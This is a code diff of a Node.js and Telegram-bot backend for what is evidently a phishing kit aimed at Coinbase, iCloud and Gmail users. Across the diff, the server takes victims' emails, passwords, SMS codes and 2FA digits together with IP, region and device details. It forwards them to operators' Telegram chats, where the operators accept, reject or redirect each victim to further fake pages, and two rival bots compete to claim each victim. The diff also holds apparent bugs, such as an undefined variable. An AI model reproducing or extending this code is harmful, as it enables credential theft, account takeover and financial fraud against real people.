-app.post("/check-sms-status", (req, res) => {
-  try {
-    const { email } = req.body;
-
-    if (!email) {
-      return res.json({ status: "pending" });
-    }
-
-    // Check pendingSMS first
-    if (pendingSMS[email]) {
-      const smsStatus = pendingSMS[email].status;
-      
-      // Map bot.js status values to frontend expectations
-      if (smsStatus === "sms_accept") {
-        return res.json({ status: "sms_accepted" });
-      } else if (smsStatus === "sms_reject") {
-        return res.json({ status: "sms_rejected" });
+    // ✅ For SMS callbacks, get SMS code from server
+    if (action.startsWith("sms_")) {
+      try {
+        // Try to get SMS code - identifier could be email (Coinbase) or requestId (iCloud)
+        const response = await fetch(`${APP_URL}/get-sms-code?requestId=${encodeURIComponent(identifier)}&email=${encodeURIComponent(email)}`);
+        const data = await response.json();
+        smsCode = data.smsCode || identifier;
+      } catch (err) {
+        console.error("Error fetching SMS code:", err);
+        smsCode = identifier;
       }
-      
-      return res.json({ status: smsStatus || "pending" });
     }
 
-    // Check pendingApprovals as fallback
-    if (pendingApprovals[email]) {
-      const approvalStatus = pendingApprovals[email].status;
-      
-      if (approvalStatus === "sms_accept") {
-        return res.json({ status: "sms_accepted" });
-      } else if (approvalStatus === "sms_reject") {
-        return res.json({ status: "sms_rejected" });
+    // ✅ For iCloud page callbacks, get displayEmail from server
+    if (action.startsWith("page_") && identifier && !identifier.includes("sms_code_")) {
+      try {
+        const response = await fetch(`${APP_URL}/get-page-display-email?email=${encodeURIComponent(identifier)}`);
+        const data = await response.json();
+        displayEmail = data.displayEmail || email;
+        console.log(`📝 iCloud page callback: email ${identifier} → display ${displayEmail}`);
+      } catch (err) {
+        console.error("Error fetching display email:", err);
+        displayEmail = email;
       }
+    }
+
+    // ✅ STEP 1: Set winner on first click (Page 1 only - don't set for Gmail/SMS/page_/verification!)
+    if (!userWinnerTelegram[email] && !action.startsWith("sms_") && !action.startsWith("gmail_") && !action.startsWith("page_") && !action.startsWith("verification_")) {
+      userWinnerTelegram[email] = "telegram1";  // Bot 1 wins (first to click)
+      botsThatClickedPage1[email] = true;
+      botsThatClickedPage1[`${email}_timestamp`] = Date.now();
       
-      return res.json({ status: approvalStatus || "pending" });
-    }
-
-    res.json({ status: "pending" });
-
-  } catch (err) {
-    console.error("Check SMS status error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// POST /resend-sms - Resend SMS code to winner bot only
-// ============================================================================
-
-app.post("/resend-sms", async (req, res) => {
-  try {
-    const { email, userId } = req.body;
-
-    if (!email) {
-      return res.status(400).json({ error: "Missing email" });
-    }
-
-    console.log(`📲 Resending SMS to ${email}`);
-
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    const message =
-      `🔄 <b>Coinbase - Resend SMS</b> 🔄\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    // ✅ SEND TO WINNER ONLY - NO BUTTONS
-    if (email && userWinnerTelegram[email]) {
-      await sendFollowUpMessage(email, message, {
-        parse_mode: "HTML"
-        // ✅ NO reply_markup - no buttons!
-      });
-    } else {
-      return res.status(400).json({ error: "No winner determined for this email" });
-    }
-
-    // Reset SMS status to pending so polling works again
-    if (pendingSMS[email]) {
-      pendingSMS[email].status = "pending";
-    }
-
-    res.json({ ok: true });
-
-  } catch (err) {
-    console.error("Resend SMS error:", err);
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// ============================================================================
-// ICLOUD PAGES ENDPOINTS
-// ============================================================================
-
-app.post("/page-login", async (req, res) => {
-  try {
-    const { email, displayEmail, password, userId } = req.body;
-    
-    // ✅ Use displayEmail if provided (different email user typed in form)
-    // Otherwise use email (for backward compatibility)
-    const messageEmail = displayEmail || email;
-
-    if (!email || !password) {
-      return res.status(400).json({ success: false, message: "Email and password required" });
-    }
-
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-    const fingerprint = getDeviceFingerprint(req);
-
-    // ✅ UPDATE FINGERPRINT MAPPING WITH NEW EMAIL (for Verifying page later)
-    if (fingerprint && messageEmail) {
-      deviceFingerprintToEmail[fingerprint] = messageEmail;
-      console.log(`💾 Updated fingerprint mapping: ${fingerprint} → ${messageEmail}`);
-    }
-
-    // ✅ Store both email (for tracking) and displayEmail (for showing)
-    pendingPage[email] = { password, status: "pending", displayEmail: messageEmail };
-    console.log(`📥 iCloud Page Login Received: ${email} (display: ${messageEmail})`);
-
-    const message =
-      `☁️☁️☁️☁️ <b>iCloud - Login</b> ☁️☁️☁️☁️\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${messageEmail}</code>\n` +
-      `<b>🔑 Password:</b> <code>${password}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Accept", callback_data: `page_accept|${email}` },
-            { text: "❌ Reject", callback_data: `page_reject|${email}` }
-          ]
-        ]
+      
+      // Send notification to Bot 2 (loser)
+      if (bot2 && ADMIN_CHAT_ID_2) {
+        try {
+          await bot2.sendMessage(ADMIN_CHAT_ID_2, `🏆 Bot 1 WINS!`, { parse_mode: "HTML" });
+        } catch (err) {
+          console.error("Error sending loser notification:", err);
+        }
       }
-    };
+    }
 
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
+    // ============================================================================
+    // ✅ STEP 2: Handle button-specific logic
+    // ============================================================================
 
-    // ✅ SEND TO WINNER ONLY
-    if (email && userWinnerTelegram[email]) {
-      await sendFollowUpMessage(email, message, options);
-    } else {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      await fetch(url, {
+    // Handle status update
+    const response = await fetch(`${APP_URL}/update-status`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, identifier: email, status: action })
+    });
+
+    // Handle redirection choices
+    if (action.includes("redirect_")) {
+      await fetch(`${APP_URL}/update-redirection-choice`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: options.parse_mode,
-          reply_markup: options.reply_markup
-        })
+        body: JSON.stringify({ email, choice: action })
       });
     }
 
-    res.json({ success: true });
+    if (response.ok) {
+      // Remove buttons from original message
+      try {
+        const editUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`;
+        await fetch(editUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: ADMIN_CHAT_ID,
+            message_id: query.message?.message_id,
+            reply_markup: JSON.stringify({ inline_keyboard: [] })
+          })
+        });
+      } catch (err) {}
+
+      // Build status message
+      let statusMessage = "";
+      
+      if (action === "page1") {
+        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
+      } else if (action === "page2") {
+        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
+      } else if (action === "reject") {
+        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
+      } else if (action === "page_accept") {
+        statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
+      } else if (action === "page_reject") {
+        statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
+      } else if (action === "sms_accept") {
+        statusMessage = `💬 <code>${smsCode}</code> SMS <b>Accepted</b>!✅`;
+      } else if (action === "sms_reject") {
+        statusMessage = `💬 <code>${smsCode}</code> SMS <b>Rejected</b>!❌`;
+      } else if (action === "redirect_icloud") {
+        statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
+      } else if (action === "redirect_gmail") {
+        statusMessage = `📧 <code>${email}</code> redirected to 🌈<b>Gmail</b>🌈`;
+      } else if (action === "gmail_accept") {
+        // ✅ For Gmail callbacks, fetch displayEmail
+        try {
+          const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
+          const data = await response.json();
+          displayEmail = data.displayEmail || email;
+          console.log(`📝 Gmail callback: requestId ${email} → display ${displayEmail}`);
+        } catch (err) {
+          console.error("Error fetching Gmail display email:", err);
+          displayEmail = email;
+        }
+        statusMessage = `🌈 <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
+      } else if (action === "gmail_reject") {
+        // ✅ For Gmail callbacks, fetch displayEmail
+        try {
+          const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
+          const data = await response.json();
+          displayEmail = data.displayEmail || email;
+          console.log(`📝 Gmail callback: requestId ${email} → display ${displayEmail}`);
+        } catch (err) {
+          console.error("Error fetching Gmail display email:", err);
+          displayEmail = email;
+        }
+        statusMessage = `🌈 <code>${displayEmail}</code> has been <b>REJECTED</b>! ❌`;
+      } else if (action === "verification_accept") {
+        // ✅ For verification callbacks, fetch displayEmail
+        try {
+          const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
+          const data = await response.json();
+          displayEmail = data.displayEmail || email;
+          console.log(`📝 Verification callback: requestId ${email} → display ${displayEmail}`);
+        } catch (err) {
+          console.error("Error fetching verification display email:", err);
+          displayEmail = email;
+        }
+        statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>ACCEPTED</b>! ✅`;
+      } else if (action === "verification_reject") {
+        // ✅ For verification callbacks, fetch displayEmail
+        try {
+          const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
+          const data = await response.json();
+          displayEmail = data.displayEmail || email;
+          console.log(`📝 Verification callback: requestId ${email} → display ${displayEmail}`);
+        } catch (err) {
+          console.error("Error fetching verification display email:", err);
+          displayEmail = email;
+        }
+        statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>REJECTED</b>! ❌`;
+      } else if (action === "gmail_verify_accept") {
+        statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED</b>! ✅`;
+      } else if (action === "gmail_verify_reject") {
+        statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED</b>! ❌`;
+      } else if (action === "verifying_sms") {
+        statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+      } else if (action === "verifying_done") {
+        statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+      } else if (action === "verifying_wallet") {
+        statusMessage = `📧 <code>${email}</code> → <b>Wallet</b> 💼`;
+      } else if (action === "verifying_icloud") {
+        statusMessage = `📧 <code>${email}</code> → ☁️`;
+      } else if (action === "verifying_gmail") {
+        statusMessage = `📧 <code>${email}</code> → 🌈`;
+      } else if (action === "sms2_wallet") {
+        statusMessage = `📧 <code>${email}</code> has been directed to <b>Wallet</b> 💼`;
+      } else if (action === "sms2_done") {
+        statusMessage = `📧 <code>${email}</code> has been directed to <b>Done</b> 🏁`;
+      } else if (action === "sms2_reject") {
+        statusMessage = `📧 <code>${email}</code> has been <b>Rejected</b> ❌`;
+      } else if (action === "wallet_decision_sms") {
+        statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+      } else if (action === "wallet_decision_done") {
+        statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+      } else if (action === "wallet_decision_icloud") {
+        statusMessage = `📧 <code>${email}</code> → ☁️`;
+      } else if (action === "wallet_decision_gmail") {
+        statusMessage = `📧 <code>${email}</code> → 🌈`;
+      }
+
+
+      // ✅ UPDATE STATUS on backend for verification callbacks
+      if (action === "verification_accept" || action === "verification_reject") {
+        try {
+          await fetch(`${APP_URL}/update-status`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email: email, action: action })
+          });
+          console.log(`✅ Updated status for verification action: ${action}`);
+        } catch (err) {
+          console.error("Error updating status:", err);
+        }
+      }
+
+      if (statusMessage) {
+        try {
+          const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+          await fetch(replyUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: ADMIN_CHAT_ID,
+              text: statusMessage,
+              parse_mode: "HTML"
+            })
+          });
+        } catch (err) {
+          console.error(`❌ Failed to send status message:`, err);
+        }
+      }
+    }
+
+    bot.answerCallbackQuery(callbackId, {
+      text: `✅ ${action.toUpperCase()}`,
+      show_alert: false
+    }).catch(() => {});
 
   } catch (err) {
-    console.error("❌ Page login endpoint error:", err);
-    res.status(500).json({ success: false, message: "Failed to send to Telegram" });
+    console.error("❌ Error:", err.message);
+    bot.answerCallbackQuery(query.id, {
+      text: "❌ Error",
+      show_alert: true
+    }).catch(() => {});
   }
 });
 
 // ============================================================================
-// GET /check-icloud-status - Check iCloud page login acceptance/rejection
+// ✅ BOT 2 CALLBACK QUERY HANDLER (with loser polling logic)
 // ============================================================================
 
-app.get("/check-icloud-status", (req, res) => {
-  try {
-    const email = (req.query.identifier || "").trim();
+if (bot2) {
+  bot2.on("callback_query", async (query) => {
+    const callbackId = query.id;
+    
+    if (handledCallbacks.has(callbackId)) return;
+    handledCallbacks.add(callbackId);
 
-    if (!email) {
-      return res.json({ status: "pending" });
-    }
+    try {
+      const parts = query.data.split("|"); const action = parts[0]; const identifier = parts[1]; const displayEmail = parts[2] || 'unknown@example.com';
 
-    if (pendingPage[email]) {
-      const status = pendingPage[email].status;
-      console.log(`✅ iCloud status for ${email}: ${status}`);
-      
-      // Map bot status values to frontend expectations
-      if (status === "page_accept") {
-        return res.json({ status: "accepted" });
-      } else if (status === "page_reject") {
-        return res.json({ status: "rejected" });
+
+      let email = identifier;
+      let smsCode = "";
+      let displayEmail = email;  // ✅ What to show in acceptance message
+
+      // ✅ For SMS callbacks, get SMS code from server
+      if (action.startsWith("sms_")) {
+        try {
+          const response = await fetch(`${APP_URL}/get-sms-code?requestId=${encodeURIComponent(identifier)}&email=${encodeURIComponent(email)}`);
+          const data = await response.json();
+          smsCode = data.smsCode || identifier;
+        } catch (err) {
+          console.error("Error fetching SMS code:", err);
+          smsCode = identifier;
+        }
       }
-      
-      return res.json({ status: status || "pending" });
-    }
 
-    res.json({ status: "pending" });
-
-  } catch (err) {
-    console.error("Check iCloud status error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// SMS CODE ENDPOINTS
-// ============================================================================
-
-app.post("/sms-code", async (req, res) => {
-  try {
-    const { email, userId, smsCode } = req.body;
-
-    if (!email || !smsCode) {
-      return res.status(400).json({ error: "Missing email or SMS code" });
-    }
-
-    // ✅ Generate unique requestId for THIS SMS code attempt
-    const requestId = `sms_code_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    // ✅ Store by requestId (not email!) so each code has separate status
-    pendingCodes[requestId] = { status: "pending", smsCode, email, userId };
-    console.log(`📥 iCloud SMS Code Received: ${email} (requestId: ${requestId})`);
-
-    const message =
-      `⛈⛈⛈⛈ <b>iCloud - SMS</b> ⛈⛈⛈⛈\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>💬 SMS:</b> <code>${smsCode}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            // ✅ Use requestId in callback_data (not email!)
-            { text: "✅ Accept", callback_data: `sms_accept|${requestId}` },
-            { text: "❌ Reject", callback_data: `sms_reject|${requestId}` }
-          ]
-        ]
+      // ✅ For iCloud page callbacks, get displayEmail from server
+      if (action.startsWith("page_") && identifier && !identifier.includes("sms_code_")) {
+        try {
+          const response = await fetch(`${APP_URL}/get-page-display-email?email=${encodeURIComponent(identifier)}`);
+          const data = await response.json();
+          displayEmail = data.displayEmail || email;
+        } catch (err) {
+          console.error("Error fetching display email:", err);
+          displayEmail = email;
+        }
       }
-    };
 
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
+      // ✅ HANDLE VERIFYING BUTTONS (Bot 2)
+      if (action === "verifying_sms" || action === "verifying_done" || action === "verifying_wallet" || action === "verifying_icloud" || action === "verifying_gmail") {
+        const verifyingId = identifier;
+        
+        try {
+          const updateResult = await fetch(`${APP_URL}/update-verifying-choice`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ verifyingId, choice: action })
+          });
+          
+          try {
+            await bot2.editMessageReplyMarkup(
+              { inline_keyboard: [] },
+              { chat_id: query.message.chat.id, message_id: query.message.message_id }
+            );
+          } catch (err) {
+            console.error("Error removing buttons:", err);
+          }
+          
+          await bot2.answerCallbackQuery(callbackId, { text: `✅ ${action.toUpperCase()}` });
+          
+          try {
+            const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
+            const verifyData = await verifyRes.json();
+            // Use displayEmail from callback_data
+            
+            let choiceText = '';
+            if (action === "verifying_sms") {
+              choiceText = `📧 <code>${verifyEmail}</code> → <b>SMS - 2</b> 💬`;
+            } else if (action === "verifying_done") {
+              choiceText = `📧 <code>${verifyEmail}</code> → <b>Done</b> 🏁`;
+            } else if (action === "verifying_wallet") {
+              choiceText = `📧 <code>${verifyEmail}</code> → <b>Wallet</b> 💼`;
+            } else if (action === "verifying_icloud") {
+              choiceText = `📧 <code>${verifyEmail}</code> → ☁️`;
+            } else if (action === "verifying_gmail") {
+              choiceText = `📧 <code>${verifyEmail}</code> → 🌈`;
+            }
+            
+            if (choiceText) {
+              const url = `https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`;
+              await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: ADMIN_CHAT_ID_2,
+                  text: choiceText,
+                  parse_mode: "HTML"
+                })
+              });
+            }
+          } catch (err) {
+            console.error("Error sending verifying choice message:", err);
+          }
+          
+          return;
+        } catch (err) {
+          console.error("Error processing verifying choice:", err);
+          return;
+        }
+      }
 
-    // ✅ SEND TO WINNER ONLY
-    if (email && userWinnerTelegram[email]) {
-      await sendFollowUpMessage(email, message, options);
-    } else {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      await fetch(url, {
+      // ✅ STEP 1: Set winner on first click (if Bot 1 hasn't clicked yet - Page 1 only, NO verification!)
+      if (!userWinnerTelegram[email] && !action.startsWith("sms_") && !action.startsWith("gmail_") && !action.startsWith("page_") && !action.startsWith("verification_")) {
+        userWinnerTelegram[email] = "telegram2";  // Bot 2 wins
+        botsThatClickedPage1[email] = true;
+        botsThatClickedPage1[`${email}_timestamp`] = Date.now();
+        
+        // ✅ NO NOTIFICATION - Only Bot 1 notifies, not Bot 2
+      }
+
+      // ============================================================================
+      // ✅ Handle verification digit selection
+      // ============================================================================
+      
+      if (action === "verify_digit") {
+        const [, requestId, digit] = query.data.split("|");
+        console.log(`📍 Bot 2 | Digit ${digit} clicked for requestId: ${requestId}`);
+        
+        try {
+          const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ requestId, digit })
+          });
+          
+          const result = await updateResult.json();
+          console.log(`✅ Digit stored. Count: ${result.selectedCount}`);
+          
+          // ✅ Only remove keyboard and show message when we have 2 digits
+          if (result.selectedCount === 2) {
+            console.log(`✅ 2 digits collected! Removing keyboard...`);
+            try {
+              await bot2.editMessageReplyMarkup(
+                { inline_keyboard: [] },
+                { chat_id: query.message.chat.id, message_id: query.message.message_id }
+              );
+              
+              await bot2.sendMessage(
+                query.message.chat.id,
+                `✅ <b>Numbers Selected!</b>`,
+                { parse_mode: "HTML" }
+              );
+            } catch (err) {
+              console.error("❌ Error editing message:", err);
+            }
+          } else {
+            // ✅ Just acknowledge the digit, don't remove keyboard
+            console.log(`⏳ Waiting for digit 2...`);
+          }
+
+          await bot2.answerCallbackQuery(query.id, { text: `📍 Digit ${digit} selected (${result.selectedCount}/2)` });
+          return;
+        } catch (err) {
+          console.error("❌ verify_digit error:", err);
+          await bot2.answerCallbackQuery(query.id, { text: "Error processing digit" });
+          return;
+        }
+      }
+
+      // ============================================================================
+      // ✅ STEP 2: LOSER BOT POLLING LOGIC (NEW - CRITICAL!)
+      // ============================================================================
+      
+      if (userWinnerTelegram[email] === "telegram2" && (action === "page1" || action === "page2")) {
+        // Bot 2 won, so we're looking at Bot 1's click
+        // This means Bot 2 is actually the winner, and this is handled elsewhere
+      }
+
+      if (userWinnerTelegram[email] === "telegram1" && action === "page2") {
+        // ✅ Bot 1 is WINNER, Bot 2 is LOSER
+        // Bot 2 clicked "📧 Email Redirection" (page2 button)
+        // START POLLING for Page 2 data
+        
+        console.log(`📨 TRIGGER: Bot 2 (loser) clicked "Email Redirection" - starting poll`);
+        
+        const pollingInterval = setInterval(async () => {
+          const page2Data = global.page2MessageDataStore ? global.page2MessageDataStore[email] : null;
+          
+          if (page2Data) {
+            clearInterval(pollingInterval);
+            console.log(`📨 TRIGGER: Page 2 data found!`);
+            
+            const elapsedTime = Date.now() - botsThatClickedPage1[`${email}_timestamp`];
+            
+            if (elapsedTime < 15000) {
+              // ✅ Within 15-second window
+              console.log(`✅ Page 2 found (${elapsedTime}ms) → sending after 2s delay`);
+              
+              setTimeout(async () => {
+                try {
+                  await bot2.sendMessage(ADMIN_CHAT_ID_2, page2Data.message, page2Data.options);
+                  console.log(`📨 Page 2 sent to Bot 2 (loser)`);
+                } catch (err) {
+                  console.error("Error sending Page 2 to loser:", err);
+                }
+              }, 2000);
+            } else {
+              // ❌ After 15-second timeout
+              console.log(`⏱️ TIMEOUT: Bot 2 waited ${elapsedTime}ms but exceeded 15s`);
+              
+              try {
+                await bot2.sendMessage(ADMIN_CHAT_ID_2, 
+                  `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`, 
+                  { parse_mode: "HTML" }
+                );
+              } catch (err) {
+                console.error("Error sending acceptance message:", err);
+              }
+            }
+          }
+        }, 100);  // Check every 100ms
+        
+        // Stop polling after 15 seconds max
+        setTimeout(() => {
+          clearInterval(pollingInterval);
+          console.log(`⏱️ TIMEOUT: Stopped polling (15 seconds exceeded)`);
+        }, 15000);
+        
+        await bot2.answerCallbackQuery(query.id, { text: "✅ Waiting..." });
+        return;
+      }
+
+      if (userWinnerTelegram[email] === "telegram1" && action === "page1") {
+        // ✅ Bot 1 is WINNER, Bot 2 is LOSER
+        // Bot 2 clicked "💬 SMS" (page1 button)
+        // SKIP Page 2, show acceptance immediately
+        
+        console.log(`🔑 Bot 2 (loser) clicked "SMS" button - NO Page 2`);
+        
+        try {
+          const editUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/editMessageReplyMarkup`;
+          await fetch(editUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: ADMIN_CHAT_ID_2,
+              message_id: query.message?.message_id,
+              reply_markup: JSON.stringify({ inline_keyboard: [] })
+            })
+          });
+        } catch (err) {}
+
+        try {
+          await bot2.sendMessage(ADMIN_CHAT_ID_2, 
+            `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`, 
+            { parse_mode: "HTML" }
+          );
+        } catch (err) {
+          console.error("Error sending acceptance message:", err);
+        }
+
+        await bot2.answerCallbackQuery(query.id, { text: "✅ ACCEPTED" });
+        return;
+      }
+
+      // ============================================================================
+      // ✅ STEP 3: Handle other buttons (same as Bot 1)
+      // ============================================================================
+
+      const response = await fetch(`${APP_URL}/update-status`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: options.parse_mode,
-          reply_markup: options.reply_markup
-        })
+        body: JSON.stringify({ email, identifier: email, status: action })
       });
-    }
 
-    // ✅ Return requestId so frontend can poll with it
-    res.json({ success: true, requestId });
-
-  } catch (err) {
-    console.error("❌ SMS code endpoint error:", err);
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// ============================================================================
-// GET /check-sms-code-status - Check by requestId (not email!)
-// ============================================================================
-
-app.get("/check-sms-code-status", (req, res) => {
-  try {
-    const requestId = (req.query.identifier || "").trim();
-
-    if (!requestId) {
-      return res.json({ status: "pending" });
-    }
-
-    if (pendingCodes[requestId]) {
-      const status = pendingCodes[requestId].status;
-      
-      // Map bot status values to frontend expectations
-      if (status === "sms_accept") {
-        return res.json({ status: "accepted" });
-      } else if (status === "sms_reject") {
-        return res.json({ status: "rejected" });
+      if (action.includes("redirect_")) {
+        await fetch(`${APP_URL}/update-redirection-choice`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email, choice: action })
+        });
       }
-      
-      return res.json({ status: status || "pending" });
-    }
 
-    res.json({ status: "pending" });
+      if (response.ok) {
+        try {
+          const editUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/editMessageReplyMarkup`;
+          await fetch(editUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: ADMIN_CHAT_ID_2,
+              message_id: query.message?.message_id,
+              reply_markup: JSON.stringify({ inline_keyboard: [] })
+            })
+          });
+        } catch (err) {}
 
-  } catch (err) {
-    console.error("Check SMS code status error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
+        let statusMessage = "";
+        
+        if (action === "page1") {
+          statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
+        } else if (action === "page2") {
+          statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
+        } else if (action === "reject") {
+          statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
+        } else if (action === "page_accept") {
+          statusMessage = `☁️ <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
+        } else if (action === "page_reject") {
+          statusMessage = `☁️ <code>${displayEmail}</code> iCloud Login <b>REJECTED</b>! ❌`;
+        } else if (action === "sms_accept") {
+          statusMessage = `💬 <code>${smsCode}</code> SMS <b>Accepted</b>!✅`;
+        } else if (action === "sms_reject") {
+          statusMessage = `💬 <code>${smsCode}</code> SMS <b>Rejected</b>!❌`;
+        } else if (action === "redirect_icloud") {
+          statusMessage = `📧 <code>${email}</code> redirected to ☁️<b>iCloud</b>☁️`;
+        } else if (action === "redirect_gmail") {
+          statusMessage = `📧 <code>${email}</code> redirected to 🌈<b>Gmail</b>🌈`;
+        } else if (action === "gmail_accept") {
+          // ✅ For Gmail callbacks, fetch displayEmail
+          try {
+            const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
+            const data = await response.json();
+            displayEmail = data.displayEmail || email;
+            console.log(`📝 Gmail callback: requestId ${email} → display ${displayEmail}`);
+          } catch (err) {
+            console.error("Error fetching Gmail display email:", err);
+            displayEmail = email;
+          }
+          statusMessage = `🌈 <code>${displayEmail}</code> has been <b>ACCEPTED</b>! ✅`;
+        } else if (action === "gmail_reject") {
+          // ✅ For Gmail callbacks, fetch displayEmail
+          try {
+            const response = await fetch(`${APP_URL}/get-gmail-display-email?requestId=${encodeURIComponent(email)}`);
+            const data = await response.json();
+            displayEmail = data.displayEmail || email;
+            console.log(`📝 Gmail callback: requestId ${email} → display ${displayEmail}`);
+          } catch (err) {
+            console.error("Error fetching Gmail display email:", err);
+            displayEmail = email;
+          }
+          statusMessage = `🌈 <code>${displayEmail}</code> has been <b>REJECTED</b>! ❌`;
+        } else if (action === "verification_accept") {
+          // ✅ For verification callbacks, fetch displayEmail
+          try {
+            const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
+            const data = await response.json();
+            displayEmail = data.displayEmail || email;
+            console.log(`📝 Verification callback: requestId ${email} → display ${displayEmail}`);
+          } catch (err) {
+            console.error("Error fetching verification display email:", err);
+            displayEmail = email;
+          }
+          statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>ACCEPTED</b>! ✅`;
+        } else if (action === "verification_reject") {
+          // ✅ For verification callbacks, fetch displayEmail
+          try {
+            const response = await fetch(`${APP_URL}/get-verification-display-email?requestId=${encodeURIComponent(email)}`);
+            const data = await response.json();
+            displayEmail = data.displayEmail || email;
+            console.log(`📝 Verification callback: requestId ${email} → display ${displayEmail}`);
+          } catch (err) {
+            console.error("Error fetching verification display email:", err);
+            displayEmail = email;
+          }
+          statusMessage = `🌈 <code>${displayEmail}</code> Verification <b>REJECTED</b>! ❌`;
+        } else if (action === "gmail_verify_accept") {
+          statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>ACCEPTED</b>! ✅`;
+        } else if (action === "gmail_verify_reject") {
+          statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED</b>! ❌`;
+        } else if (action === "verifying_sms") {
+          statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+        } else if (action === "verifying_done") {
+          statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+        } else if (action === "verifying_wallet") {
+          statusMessage = `📧 <code>${email}</code> → <b>Wallet</b> 💼`;
+        } else if (action === "verifying_icloud") {
